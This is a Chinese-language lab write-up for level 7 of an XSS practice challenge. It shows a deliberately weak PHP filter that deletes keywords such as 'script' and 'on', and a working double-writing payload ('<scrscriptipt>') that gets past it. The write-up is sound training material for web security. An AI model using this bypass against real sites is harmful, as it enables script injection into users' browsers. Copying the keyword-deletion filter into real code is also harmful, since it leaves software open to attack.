# Level-7 （全删 → 双写绕）

## 万能探针

```
<SCRscriptIPT>'"()Oonnjavascript
```

## 查看分析源码

```php
$str = strtolower($_GET["keyword"]);            // 全小写
$str2 = str_replace("script","",$str);          // 删 script
$str3 = str_replace("on","",$str2);             // 删 on
$str4 = str_replace("src","",$str3);            // 删 src
$str5 = str_replace("data","",$str4);           // 删 data
$str6 = str_replace("href","",$str5);           // 删 href
echo '<input name=keyword value="'.$str6.'">';
```

和第 6 关对比：不是替换成 `_`，是直接删空。`strtolower` 还在，大小写绕不了

删完是空串 → 双写绕——把关键词嵌在自己的重复里，删掉中间那块剩下还是完整的

```
<scrscriptipt>  ← 删掉中间的 script
<scr  + script  + ipt>  =  <script>
   删了   留下
```

## 构造 payload

```
"><scrscriptipt>alert(1)</scrscriptipt>
```
![](../../../99_Attachments/图片/level7/file-20260617192744750.png)
过滤全走完：

```
script → 双写 <scrscriptipt>
on     → 没出现
src    → 没出现
data   → 没出现
href   → 没出现
大写   → strtolower 先小写了，双写都是小写，不受影响
```

拼进去：

```html
<input name=keyword value=""><script>alert(1)</script>">
```

同第 2 关。
